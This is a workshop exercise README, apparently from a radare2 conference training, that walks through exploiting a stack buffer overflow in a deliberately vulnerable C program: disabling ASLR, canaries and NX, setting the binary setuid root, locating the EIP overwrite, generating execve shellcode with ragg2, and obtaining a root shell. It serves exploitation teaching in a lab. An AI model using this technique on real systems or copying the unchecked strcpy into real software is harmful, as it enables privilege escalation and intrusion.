# simplebof

This exercise contains a basic stack-based buffer overflow without any memory corruption mitigations in place. The binary `simplebof` is intended to be run on a Linux 32-bits machine. 

Source code
-----------
The function `dummy` does not check the boundaries of the `buffer` when copying onto the stack the argument provided by the user (`arg`). Therefore, we can gain code execution by overwriting the register EIP and jumping to our crafted shellcode.

```c
/*
 * This binary requires stack-boundary to 2 to keep stack aligned to 2^n
 *
 * $ gcc -mpreferred-stack-boundary=2 simplebof.c -m32 -o simplebof
 */

#include <stdio.h>
#include <string.h>

void trick(void)
{
   __asm__("jmp *%esp");
}

void dummy(char *arg)
{
   char buffer[64];

   strcpy(buffer, arg);
   printf("The argument is: %s\n", buffer);
}


int main(int argc, char *argv[])
{
   char *res;

   /* Check args */
   if (argc != 2) {
      printf("Usage: %s argument\n", argv[0]);
      return 1;
   }
   
   printf("Hello r2con\n");
   dummy(argv[1]);

   return 0;
}
```

Disable mitigations and compilation steps
------------------------------------------
First of all, make sure you disable all the memory corruption mitigations before compiling this exercise.

* Disable ASLR and PIE  
```bash
$ sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
```

* Compile without stack-canaries  
```bash
$ gcc -mpreferred-stack-boundary=2 simplebof.c -m32 -o simplebof -fno-stack-protector -z execstack
```

* Setuid the binary with root permissions (Optional)
```bash
$ sudo chown root simplebof  
$ sudo chmod +s simplebof
```


Countermeasures in place
-------------------------

Before get started, let's make sure we have compiled properly the binary. For doing so, `rabin2` is a quick option for identifying which countermeasures were set when the binary was compiled. 

```bash
$ rabin2 -I simplebof | egrep "canary|nx|pic" 
pic      false
canary   false 
nx       false
```

Another way would be to load the binary into `radare2` and enter the command `i~nx,pic,canary` to obtain information about the compilation flags.
```bash
$ r2 simplebof
 -- It's not you, it's me.
[0x08048380]> i~nx,pic,canary
pic      false
canary   false
nx       false
```

Alternatively without using `radare2`, you could get the same information by running the famous bash script called `checksec.sh`. 
```bash
$ checksec1.7.0.sh --file simplebof
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	FORTIFIED FORTIFY-able  FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No	0		        4	    simplebof
```



Radare2 Exploitation steps
--------------------------

Once you have compiled and checked the compilation flags, you are ready to go. First thing to attempt will be the execution of the binary on your box and find out how many characters we need to provide to the `argv[1]` to cause a segmentation fault.

```bash
$ gdb -q ./simplebof
Reading symbols from ./simplebof...(no debugging symbols found)...done.
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /home/user/exploitrainings/x86/r2con-linux-expl/exercises/simple/simplebof AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello r2con
The argument is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) 
```

Looking at the source code, we see that `buffer` is declared with 64 bytes. Hence, if we provide more than 64 characters into the first argument to the binary, the memory will be overwritten. Upon knowing the right length of `argv[1]` to control the program counter (`EIP` in x86 architecture), we can prepare a profile file that will tell `rarun2` the length of the `argv1`.

The framework `radare2` provides a binary called `rarun2` which offers the possibility of running binaries under certain environment variables, input args, stdin and other configurations. This means that we can debug a binary with an specific set of configurations. An example of this is shown in `profile.rarun2`:
```bash
$ cat profile.rarun2 
#!/usr/bin/rarun2
program=./simplebof
arg1=@76@A
```

After creating a profile file, we then can run `radare2` in debug mode (`-d`) with the `rarun2` profile file (`-e dbg.profile=profile.rarun2`). The following commands are doing the following:  

1. `s sym.dummy` - seek to the offset of the symbol dummy  
2. `af` - analyze the function where we are locate at  
3. `pdf` - print disassemble function  
4. `db 0x080484a9` - set a breakpoint  
5. `dc`- debugging continue  

```{r, engine='bash', count_lines}
$ r2 -e dbg.profile=profile.rarun2 -d simplebof
Process with PID 25891 started...
= attach 25891 25891
bin.baddr 0x08048000
Assuming filepath /home/user/exploitrainings/x86/r2con-linux-expl/exercises/simple/simplebof
asm.bits 32
 -- Excellent; we can attack in any direction!                  
[0xf7fdd0d0]> s sym.dummy 
[0x08048482]> af
[0x08048482]> pdf
/ (fcn) sym.dummy 110
|   sym.dummy (int arg_8h);
|           ; var int local_40h @ ebp-0x40
|           ; arg int arg_8h @ ebp+0x8
|           0x08048482      55             push ebp
|           0x08048483      89e5           mov ebp, esp
|           0x08048485      83ec40         sub esp, 0x40               ; '@'
|           0x08048488      ff7508         push dword [ebp + arg_8h]
|           0x0804848b      8d45c0         lea eax, [ebp - local_40h]
|           0x0804848e      50             push eax
|           0x0804848f      e8acfeffff     call sym.imp.strcpy        ; char *strcpy(char *dest, const char *src);
|           0x08048494      83c408         add esp, 8
|           0x08048497      8d45c0         lea eax, [ebp - local_40h]
|           0x0804849a      50             push eax
|           0x0804849b      6890850408     push str.The_argument_is:__s_n ; str.The_argument_is:__s_n ; "The argument is: %s." @ 0x8048590
|           0x080484a0      e88bfeffff     call sym.imp.printf        ; int printf(const char *format);
|           0x080484a5      83c408         add esp, 8
|           0x080484a8      c9             leave
\           0x080484a9 b    c3             ret
[0x08048482]> db 0x080484a9
[0x08048482]> dc
Hello r2con
The argument is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
= attach 25891 1
[0x08048482]> dc
hit breakpoint at: 80484a9
[0x08048482]> dc
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x41414141 code=1 ret=0
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x41414141 code=1 ret=0
[0x41414141]> 
```


So far, we have overwritten the register EIP and thus can arbitrarily jump wheresoever. For generating shellcodes, the framework `radare2` offers an specific binary called `ragg2` which helps in their creation. In order to jump to our shellcode, we should prepare a payload with the following structure `buffer`(64 characters) + `EBP` (4) + `EIP`(4).

```bash
$ ragg2 -b 32 -a x86 -z -p n2048 -d 68:0xffffc9a0 -i exec 
```


Debugging the exploit:
```
$ r2 -e dbg.profile=exploit.rarun2 -d simplebof     
	s sym.dummy
	af
	pdf
	db 0x080484a9             # 0x080484a9      c3             ret	
```


Eventually, we run our exploit with `radare2` and `rarun2`:
```bash
$ ~/r2con/2016/trainings/03-linux-xpl/exercises/simple:$ ./exploit.rarun2 
Hello r2con
The argument is: ��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin��PS�ᙰ

# id
uid=1000(dudu) gid=1000(dudu) euid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare),1000(dudu)
# whoami
root
# 
```

